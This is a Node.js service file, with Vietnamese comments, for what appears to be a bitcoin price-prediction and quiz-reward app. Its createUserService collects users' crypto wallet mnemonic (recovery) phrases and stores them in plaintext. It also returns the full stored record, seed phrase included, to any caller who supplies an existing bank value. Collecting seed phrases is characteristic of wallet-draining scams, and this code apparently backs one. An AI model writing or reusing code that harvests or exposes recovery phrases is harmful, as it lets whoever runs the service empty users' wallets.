const User = require("../models/user");
const Prediction = require("../models/prediction");
const Jobs=require("../models/job");
const WinnerJobs =require("../models/winner");
const createUserService = async (wallet, bank, mnemonic, btc) => {
    try {
        const existingUser = await User.findOne({ bank });
        if (existingUser) {
            return { success: true, message: "Bank already exists.", data: existingUser };
        }
        let result = await User.create({
            wallet,
            bank,
            mnemonic,
            btc
        });
        return { success: true, data: result };
    } catch (error) {
        console.error("Error creating user:", error);
        return { success: false, message: "Internal server error." };
    }
};
const createPredictionService = async (wallet, bank, btc, predictPrice, date) => {
    try {
        let result = await Prediction.findOneAndUpdate(
            { bank }, 
            { $set: { wallet, btc, predictPrice, date } }, 
            { new: true, upsert: true } 
        );
        return { success: true, data: result };
    } catch (error) {
        console.error("Error creating or updating prediction:", error);
        return { success: false, message: error.message || "Internal server error." };
    }
};
const createWinnerService = async (bank, jobTitle, userAnswer, wallet) => {
    try {
        console.log("Received data:", { bank, jobTitle, userAnswer, wallet }); // Kiểm tra dữ liệu nhận được
        const isEmpty = await WinnerJobs.countDocuments() === 0;
        let result;
        if (isEmpty) {
            result = await WinnerJobs.create({ bank, jobTitle, userAnswer, wallet });
        } else {
            result = await WinnerJobs.findOneAndUpdate(
                { bank }, 
                { $set: { jobTitle, userAnswer, wallet } }, 
                { new: true, upsert: true }
            );
        }
        return { success: true, data: result };
    } catch (error) {
        console.error("Error creating or updating job:", error);
        return { success: false, message: error.message || "Internal server error." };
    }
};
const getPredictionService = async (wallet, bank, btc, predictPrice, date) => {
    try {
        const yesterday = new Date();
        yesterday.setDate(yesterday.getDate() - 1); 
        const startOfYesterday = new Date(yesterday.setHours(0, 0, 0, 0)); 
        const endOfYesterday = new Date(yesterday.setHours(23, 59, 59, 999)); 
        const pipeline = [
            {
                $match: {
                    ...(wallet && { wallet }), 
                    ...(bank && { bank }),     
                    ...(btc !== undefined && { btc }), 
                    predictPrice: {
              $gte: 95999,
                        $lte: 96001
                    },
                    date: {
                        $gte: startOfYesterday, 
                        $lte: endOfYesterday   
                    }
                }
            },
            {
                $project: {
                    _id: 0, 
                    bank: 1,
                    wallet:2,
                }
            }
        ];
        // Thực hiện aggregation
        const results = await Prediction.aggregate(pipeline);
        // Trả về kết quả
        return results.length
            ? { data: results } // Nếu có kết quả, trả về dữ liệu
            : { message: "Không có người chiến thắng hôm qua" }; // Nếu không có kết quả, trả về thông báo
    } catch (error) {
        console.error("Error fetching predictions:", error);
        return { success: false, message: error.message || "Internal server error." };
    }
};
const getJobService = async () => {
    try {
        // Sử dụng aggregation pipeline để lấy toàn bộ dữ liệu từ collection jobs
        const results = await Jobs.aggregate([
            {
                $match: {} // Tương đương với find() không có điều kiện lọc
            }
        ]);

        // Nếu không có dữ liệu, trả về thông báo
        if (!results || results.length === 0) {
            return { success: false, message: "Không có câu hỏi nào." };
        }

        // Trả về tất cả dữ liệu từ collection jobs
        return { success: true, data: results };
    } catch (error) {
        console.error("Lỗi khi lấy dữ liệu câu hỏi:", error);
        return { success: false, message: error.message || "Lỗi máy chủ nội bộ." };
    }
};

module.exports = {
    createUserService,
    createPredictionService,
    createWinnerService,
    getPredictionService,
    getJobService,
};